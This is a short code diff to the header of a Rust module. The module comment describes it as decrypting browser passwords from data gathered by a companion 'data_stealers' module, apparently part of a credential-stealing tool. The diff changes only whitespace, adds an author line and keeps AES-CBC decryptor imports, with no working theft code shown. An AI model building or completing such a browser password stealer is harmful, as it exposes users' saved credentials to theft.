@@ -1,10 +1,10 @@
 /**
  * Module contains algorithms for passwords decryption.
- * Such algorithms use stealed data (see data_stealers.rs module) 
+ * Such algorithms use stealed data (see data_stealers.rs module)
  * and depends on browser.
- * 
+ *
+ * Max A.Jurankov (astronmax) 2022
  */
-
 use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit};
 
 type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;
